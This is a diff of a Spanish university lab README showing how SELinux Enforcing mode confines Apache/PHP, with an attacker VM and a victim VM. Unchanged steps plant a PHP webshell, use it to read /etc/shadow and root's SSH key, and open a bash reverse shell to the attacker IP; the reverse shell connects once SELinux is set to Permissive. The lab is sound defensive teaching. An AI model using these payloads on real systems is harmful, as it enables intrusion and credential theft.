@@ -1,6 +1,7 @@
+```markdown
 <div align="center">
 
-# 🔐 SELinux — Control Obligatorio de Acceso (MAC) en Linux
+# SELinux — Control Obligatorio de Acceso (MAC) en Linux
 
 ![SELinux](https://img.shields.io/badge/SELinux-Enforcing-red?style=for-the-badge&logo=linux&logoColor=white)
 ![Rocky Linux](https://img.shields.io/badge/Rocky_Linux-9-10B981?style=for-the-badge&logo=rockylinux&logoColor=white)
@@ -14,38 +15,36 @@
 
 <br/>
 
-| 👤 Integrante | 🎯 Rol |
-|:---:|:---:|
-| Mia | Teoría — Introducción y fundamentos |
-| Lex | Teoría — Funcionamiento, modos y hardening |
-| Abel | Demo — Ataque desde Kali Linux |
-| Chester | Demo — Defensa y diagnóstico en Rocky Linux |
+| Integrante      | Rol |
+|:------------------|:--------|
+| Abelardo Cárcamo | Teoría y Demo — Hardening, configuración y defensa con SELinux en Rocky Linux |
+| Chester Ferrer   | Demo — Ataques y pruebas desde Kali Linux |
 
 </div>
 
 ---
 
-## 📋 Tabla de Contenidos
+## Tabla de Contenidos
 
-- [🎯 Objetivos](#-objetivos)
-- [🏗️ Infraestructura](#️-infraestructura)
-- [⚙️ Paso 1 — Instalación de dependencias](#️-paso-1--instalación-de-dependencias)
-- [🚀 Paso 2 — Iniciar servicios](#-paso-2--iniciar-servicios)
-- [🔍 Paso 3 — Verificar estado de SELinux](#-paso-3--verificar-estado-de-selinux)
-- [🏷️ Paso 4 — Verificar contextos de seguridad](#️-paso-4--verificar-contextos-de-seguridad)
-- [🐚 Paso 5 — Plantar el webshell](#-paso-5--plantar-el-webshell)
-- [💥 Paso 6 — Ataque con SELinux Enforcing](#-paso-6--ataque-con-selinux-enforcing-debe-fallar)
-- [🔬 Paso 7 — Diagnóstico de bloqueos](#-paso-7--diagnóstico-de-bloqueos)
-- [⚔️ Paso 8 — Contraste: Permissive vs Enforcing](#️-paso-8--contraste-permissive-vs-enforcing)
-- [🔧 Paso 9 — restorecon](#-paso-9--restorecon-corregir-contexto-mal-etiquetado)
-- [📁 Paso 10 — semanage](#-paso-10--semanage-directorio-personalizado)
-- [✅ Paso 11 — Restaurar estado final](#-paso-11--restaurar-estado-final)
-- [🛠️ Resumen de herramientas](#️-resumen-de-herramientas)
-- [📌 Conclusiones](#-conclusiones)
+- [Objetivos](#objetivos)
+- [Infraestructura](#infraestructura)
+- [Paso 1 — Instalación de dependencias](#paso-1--instalación-de-dependencias)
+- [Paso 2 — Iniciar servicios](#paso-2--iniciar-servicios)
+- [Paso 3 — Verificar estado de SELinux](#paso-3--verificar-estado-de-selinux)
+- [Paso 4 — Verificar contextos de seguridad](#paso-4--verificar-contextos-de-seguridad)
+- [Paso 5 — Plantar el webshell](#paso-5--plantar-el-webshell)
+- [Paso 6 — Ataque con SELinux Enforcing](#paso-6--ataque-con-selinux-enforcing-debe-fallar)
+- [Paso 7 — Diagnóstico de bloqueos](#paso-7--diagnóstico-de-bloqueos)
+- [Paso 8 — Contraste: Permissive vs Enforcing](#paso-8--contraste-permissive-vs-enforcing)
+- [Paso 9 — restorecon](#paso-9--restorecon-corregir-contexto-mal-etiquetado)
+- [Paso 10 — semanage](#paso-10--semanage-directorio-personalizado)
+- [Paso 11 — Restaurar estado final](#paso-11--restaurar-estado-final)
+- [Resumen de herramientas](#resumen-de-herramientas)
+- [Conclusiones](#conclusiones)
 
 ---
 
-## 🎯 Objetivos
+## Objetivos
 
 - Demostrar la diferencia entre **DAC** y **MAC** en un entorno real
 - Configurar y validar SELinux en modo **Enforcing** sobre un servidor Apache con PHP
@@ -54,15 +53,15 @@
 
 ---
 
-## 🏗️ Infraestructura
+## Infraestructura
 
 ```
 ┌─────────────────────────────┐         ┌─────────────────────────────┐
-│    💻 Laptop Abel (VMware)  │         │  💻 Laptop Chester (VMware) │
+│    Laptop Abel (VMware)     │         │  Laptop Chester (VMware)    │
 │                             │         │                             │
-│   Rocky Linux 9 — VÍCTIMA  │◄────────│   Kali Linux — ATACANTE    │
+│   Rocky Linux 9 — VICTIMA   │◄────────│   Kali Linux — ATACANTE     │
 │   192.168.10.1              │ ethernet│   192.168.10.2              │
-│                             │  físico │                             │
+│                             │  fisico │                             │
 │   Apache + PHP + SELinux    │         │   nmap · nc · curl          │
 │   Adaptador: Bridged        │         │   Adaptador: Bridged        │
 └─────────────────────────────┘         └─────────────────────────────┘
@@ -72,7 +71,7 @@
 
 ---
 
-## ⚙️ Paso 1 — Instalación de dependencias
+## Paso 1 — Instalación de dependencias
 
 ```bash
 dnf install -y httpd php php-cli php-fpm \
@@ -92,7 +91,7 @@ dnf install -y httpd php php-cli php-fpm \
 
 ---
 
-## 🚀 Paso 2 — Iniciar servicios
+## Paso 2 — Iniciar servicios
 
 ```bash
 systemctl enable --now php-fpm
@@ -103,7 +102,7 @@ firewall-cmd --reload
 
 ---
 
-## 🔍 Paso 3 — Verificar estado de SELinux
+## Paso 3 — Verificar estado de SELinux
 
 ```bash
 getenforce
@@ -122,7 +121,7 @@ Policy name:                    targeted
 
 ---
 
-## 🏷️ Paso 4 — Verificar contextos de seguridad
+## Paso 4 — Verificar contextos de seguridad
 
 ```bash
 # Contexto de procesos Apache
@@ -140,16 +139,16 @@ ls -Z /var/www/html/
 system_u : system_r : httpd_t : s0
     │           │         │       │
     │           │         │       └── Nivel MLS/MCS
-    │           │         └────────── Tipo  ← el más importante
+    │           │         └────────── Tipo  ← el mas importante
     │           └──────────────────── Rol
     └──────────────────────────────── Usuario SELinux
 ```
 
-> 💡 El **tipo** (`httpd_t`, `passwd_file_t`, `user_tmp_t`) es el campo crítico — define exactamente qué acciones están permitidas entre sujetos y objetos según la política.
+> El **tipo** (`httpd_t`, `passwd_file_t`, `user_tmp_t`) es el campo crítico — define exactamente qué acciones están permitidas entre sujetos y objetos según la política.
 
 ---
 
-## 🐚 Paso 5 — Plantar el webshell
+## Paso 5 — Plantar el webshell
 
 ```bash
 printf '<?php\nif(isset($_GET["cmd"])){\n    echo "<pre>".shell_exec($_GET["cmd"])."</pre>";\n}\n?>' \
@@ -170,38 +169,38 @@ curl "http://localhost/shell.php?cmd=id"
 # <pre>uid=48(apache) gid=48(apache) context=system_u:system_r:httpd_t:s0</pre>
 ```
 
-> ✅ El webshell responde. El proceso corre como `httpd_t` — confinado por SELinux.
+> El webshell responde. El proceso corre como `httpd_t` — confinado por SELinux.
 
 ---
 
-## 💥 Paso 6 — Ataque con SELinux Enforcing (debe fallar)
+## Paso 6 — Ataque con SELinux Enforcing (debe fallar)
 
 Ejecutado desde **Kali Linux** (`192.168.10.2`):
 
 ```bash
-# 🔴 Intento 1 — Leer /etc/shadow
+# Intento 1 — Leer /etc/shadow
 curl "http://192.168.10.1/shell.php?cmd=cat+/etc/shadow"
 # Resultado: <pre></pre>  ← BLOQUEADO
 
-# 🔴 Intento 2 — Leer clave SSH de root
+# Intento 2 — Leer clave SSH de root
 curl "http://192.168.10.1/shell.php?cmd=cat+/root/.ssh/id_rsa"
 # Resultado: <pre></pre>  ← BLOQUEADO
 
-# 🔴 Intento 3 — Reverse shell
+# Intento 3 — Reverse shell
 # [Kali — Terminal 1] Abrir listener:
 nc -lvnp 4444
 
 # [Kali — Terminal 2] Lanzar reverse shell:
 curl "http://192.168.10.1/shell.php?cmd=bash+-i+>%26+/dev/tcp/192.168.10.2/4444+0>%261"
-# Resultado: listener no recibe conexión  ← BLOQUEADO
+# Resultado: listener no recibe conexion  ← BLOQUEADO
 ```
 
-> ❓ **¿Por qué falla?**
+> **¿Por que falla?**
 > El proceso `httpd_t` no tiene política para leer `shadow_t` ni `ssh_home_t`, y tampoco para abrir conexiones TCP salientes arbitrarias. SELinux bloquea en la capa MAC **independientemente** de los permisos Unix.
 
 ---
 
-## 🔬 Paso 7 — Diagnóstico de bloqueos
+## Paso 7 — Diagnóstico de bloqueos
 
 ```bash
 # Deshabilitar reglas dontaudit para ver TODOS los bloqueos
@@ -233,16 +232,16 @@ tclass=capability permissive=0
 
 ---
 
-## ⚔️ Paso 8 — Contraste: Permissive vs Enforcing
+## Paso 8 — Contraste: Permissive vs Enforcing
 
-### 🟡 Cambiar a Permissive
+### Cambiar a Permissive
 
 ```bash
 setenforce 0
 getenforce  # → Permissive
 ```
 
-### 💀 Repetir el ataque — ahora SÍ conecta
+### Repetir el ataque — ahora SI conecta
 
 ```bash
 # [Rocky — Terminal] Listener
@@ -259,20 +258,20 @@ hostname  # → localhost.localdomain
 cat /etc/passwd
 ```
 
-### 🟢 Volver a Enforcing
+### Volver a Enforcing
 
 ```bash
 setenforce 1
 getenforce  # → Enforcing
 ```
 
-> 🧠 **Conclusión del contraste:**
+> **Conclusion del contraste:**
 > Mismo servidor · mismo webshell · mismos permisos Unix.
 > La única variable fue `setenforce`. **Permissive solo registra — Enforcing bloquea.**
 
 ---
 
-## 🔧 Paso 9 — `restorecon`: corregir contexto mal etiquetado
+## Paso 9 — `restorecon`: corregir contexto mal etiquetado
 
 ```bash
 # 1. Simular contexto incorrecto con chcon
@@ -294,7 +293,7 @@ ls -Z /var/www/html/test.php
 
 ---
 
-## 📁 Paso 10 — `semanage`: directorio personalizado
+## Paso 10 — `semanage`: directorio personalizado
 
 ```bash
 # 1. Crear directorio fuera del DocumentRoot estándar
@@ -318,7 +317,7 @@ ls -Z /webdemo/
 # unconfined_u:object_r:httpd_sys_content_t:s0  ← ✅
 ```
 
-> ⚠️ **Diferencia crítica:**
+> **Diferencia crítica:**
 > | Herramienta | Persistencia |
 > |---|---|
 > | `chcon` | Temporal — se pierde en relabel o reboot |
@@ -326,7 +325,7 @@ ls -Z /webdemo/
 
 ---
 
-## ✅ Paso 11 — Restaurar estado final
+## Paso 11 — Restaurar estado final
 
 ```bash
 # Reactivar reglas dontaudit
@@ -340,7 +339,7 @@ sestatus
 
 ---
 
-## 🛠️ Resumen de herramientas
+## Resumen de herramientas
 
 | Herramienta | Función |
 |---|---|
@@ -358,7 +357,7 @@ sestatus
 
 ---
 
-## 📌 Conclusiones
+## Conclusiones
 
 1. **DAC no es suficiente** — los permisos Unix pueden ser correctos y aun así SELinux bloquea acciones no autorizadas por política
 2. **El tipo es lo más importante** — `httpd_t` define exactamente qué puede y qué no puede hacer Apache, sin importar que corra como root
@@ -373,7 +372,8 @@ sestatus
 **Universidad Tecnológica de Panamá**  
 Licenciatura en Ciberseguridad · 2026
 
-![Made with](https://img.shields.io/badge/Made_with-❤️_y_SELinux-red?style=flat-square)
+![Made with](https://img.shields.io/badge/Made_with-Love_y_SELinux-red?style=flat-square)
 ![Status](https://img.shields.io/badge/Lab_Status-Validated-brightgreen?style=flat-square)
 
 </div>
+```
